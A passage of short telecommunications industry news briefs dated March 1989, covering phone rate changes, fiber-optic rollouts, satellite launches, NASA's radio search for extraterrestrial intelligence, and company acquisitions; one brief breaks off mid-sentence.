   AT&T says it's saving the ozone layer. The company says it has

developed a way to eliminate the chemical CFC-113 from a process

it uses to make electronic circuit boards. Scientists say the

chemical may damage the ozone layer of the earth's atmosphere,

which protects people from dangerous ultraviolet rays from the

sun. (From the USA TODAY Money section.)



SERVICE STOPPED IN CANADA:

   Bell Canada has decided to end its 976 phone service in all of

its service regions, Telecommunications magazine says. The firm

said significant increases in cost and an anticipated decline in

revenues as primary factors in making the decision. Bell Canada is

the nation's largest telecommunications operating company.



MCI FAX HAS SEVERAL FEATURES:

   MCI has moved fast on fax. Telecommunications magazine reports

that MCI has become the first long-distance company in the USA to

offer a dedicated network for domestic and international fax

transmissions. Called MCI FAX, the service will include management

information reports, customized dialing plans, credit card billing

and other features.



-------------------------------------------------------------------------------

March 8, 1989

PACBELL TRUNK FEES SHOOT HIGHER:

   Costs on Pacific Bell's Assured PBX Trunk Line Service have

jumped nearly 50%, according to Network World. The increase was

made after the California Public Utilities Commission approved a

PacBell plan to create a new trunk service and raise rates for

what was once the only grade of service available. One firm with

2,000 trunks will pay about $96,000 more per year.



BELL PUTS FIBER INTO LAUNCH:

   Southern Bell and Bell Communications Research engineers are

working with NASA to prepare for a high definition TV taping and

transmission of the launch of the space shuttle Discovery.

Broadcasting magazine says Southern Bell and Bellcore are handling

a live fiber-optic transmission of the launch. A temporary studio

has been built at Kennedy Space Center.



RATES WILL DROP IN ALABAMA:

   The Alabama State Public Service Commission said in Montgomery

yesterday that phone rates will soon drop in the state. Ordered:

South Central Bell must reduce rates by $9 million by April. Cuts:

25 cents off the monthly Touch-Tone service; the elimination of

the Touch-Tone installation fee.



SATELLITE FLIES FOR JAPAN:

   The next launch of Arianespace is scheduled for the end of

March. Using the ELA 1 launch complex, an Ariane 2 launch vehicle

will place into orbit the Swedish direct broadcasting and

communications satellite TELE-X. The group last Saturday launched

the first Japanese telecommunications satellite JCSAT 1 and the

first European meteorological satellite MOP 1.



OPTIONS ADDED TO VOICE LINE:

   VoiceCom Systems has added 3 new service options to its voice

messaging product line, extended its worldwide communications

network, and created a new business unit to develop and implement

custom voice response applications. VoiceCom also introduced Guest

Mailbox service, which allows VoiceCom customers to temporarily

assign special voice mailboxes to their customers and vendors.



MODEMS ARE SLEEK, SOPHISTICATED:

   Some modems are being marketed like sleek sports cars. General

DataComm Industries is touting 2 new leased-line modems for

9,600-bit-per-second data communications as "the perfect balance

of technology and style," CommunicationsWeek says. Also: The

company says they include "sophisticated features" in "small,

stylish enclosures."



RADIO TELESCOPES LOOK IN SPACE:

   112-foot-diameter and 210-foot-diameter radio telescopes in

NASA's Deep Space Network will be used in the search for

extraterrestrial intelligence in space. Located in the Mojave

Desert and Australia, the telescopes will survey the universe over

a wide radio frequency range and spot-check bands up to 25,000

megahertz for some signal that indicates intelligence.



RADIO WILL SEARCH SILENT VALLEY:

   NASA's radio network searching for intelligence in space will

cover at least 10,000 times more frequencies than all previous

surveys and be 300 times more sensitive. The search will hunt for

signals from stars similar to Earth's sun, up to 80 light years

from Earth. Of particular interest: The region from about 1,000

megahertz to 60,000 megahertz, the silent valley of frequencies.



PHONE WILL KEEP HER IN TOUCH:

   A telephone and computer electronic mail service will keep

Abigale K. Alling in touch with the world when she begins a 5-day

experiment today in the Arizona desert. She will enter a

20-foot-high, 23-foot-square test module through an air lock and

sever the umbilical cord with Earth. She will be cut off from

everything except sunlight and communication links with the

outside world.



-------------------------------------------------------------------------------

March 9, 1989

AT&T MAKES LINK, CHIP FOR JAPAN:

   AT&T announced 2 products yesterday for Japan: A high-speed,

fiber optic data link and an Integrated Services Digital Network

(ISDN) microchip. The microchip can work with a variety of

microprocessors and other ISDN chips. It will more easily allow

Japanese telephone users to have access to a digital network that

can provide data, voice, and image transmission on one phone line.



LINK WILL HAVE LAN, VIDEO USES:

   AT&T is developing the ODL 125-FC Lightwave Data Link to comply

with Japan's industry standard for fiber-optic connectors, AT&T

said yesterday. Comprised of a receiver and transmitter, it

converts electrical signals to optical signals for fiber optic

data transmission. Applications include fiber-optic,

token-passing-ring Local Area Networks, and transmission of

digitized video signals.



NEW WATS JOINS THE MARKET:

   Advanced Telecommunications has announced a new long distance

service, Standard PLUS WATS, designed for small business

customers. Standard PLUS WATS will benefit the business caller

whose monthly long distance bill exceeds $150, the company said.

Standard PLUS features volume discounts up to 21%, 6-second

incremental billing and free call detail.



CARRIER GROUP GIVES SUPPORT:

   The Signaling System 7 from CCITT has won the support of the

National Telecommunications Network. SS7 would let NTN provide

Integrated Services Digital Network services, calling card

services and advanced toll-free services, reports Network World.

The 18,000-route mile network has customers in 175 cities.



HUGHES OBTAINING NETWORK FIRM:

   Sytek Inc., a producer of local network equipment, is being

bought by Hughes Aircraft for an estimated $50 million, Network

World reports. The deal still needs SEC approval. Sytek products

include broadband, fiber-optic and twisted-pair versions of

Ethernet and token-ring networks. The acquisition has been

discussed for months.



TULSA METROLINK TO BE BOUGHT:

   Dallas-based Columbine Telenet has entered an agreement to

purchase Tulsa MetroLink from Public Service Co. of Oklahoma,

officials said yesterday. Tulsa MetroLink is a 110 mile digital

fiber optic communications system founded in 1984 by PSO to

provide for high speed data and voice transmission to meet

internal communications needs.



TULSA FIRM HAS LONGEST FIBER:

   Tulsa Metrolink, which is being purchased by Columbine Telenet,

includes the longest single span of fiber in the USA - 1,944 feet

across the Arkansas River. The network can carry more than 400

million bits of data each second and can handle 6,000 simultaneous

voice conversations. Laser beams translate data or voice signals

into on-off lights sent through glass fibers finer than human

FLORIDA SITE PLUGGED INTO FIBER:

   The latest development in fiber optic technology is bringing

fiber to the home, Southern Bell says. Heathrow, a mixed use

development north of Orlando, Fla., is on the leading edge of

fiber-to-the-home efforts. At Heathrow, residents will receive

voice, data and video over the same fiber system. The system

points to the day when optical fiber will be possible over all

telephones.



AREA SET FOR VOICE-ONLY FIBER:

   The first widespread appearance of optical fiber to the home

will be traditional voice lines, Southern Bell says. The company

will begin using fiber for voice-only delivery later this year in

Governor's Island, north of Charlotte, N.C., and several other

locations. Studies show that fiber systems to carry voice to the

home will be more economical than copper by the early 1990s.



FIBER IS GOING SINGLE-MODE:

   Southern Bell uses fiber systems that operate at up to 1.2

billion digital bits a second on a single fiber (the equivalent of

more than 16,000 simultaneous voice conversations), the firm says.

Since 1985, most of the optical fiber placed in Southern Bell has

been single-mode, which has a thinner core than its multi-mode

counterpart, keeping lightwaves traveling in a straight path.
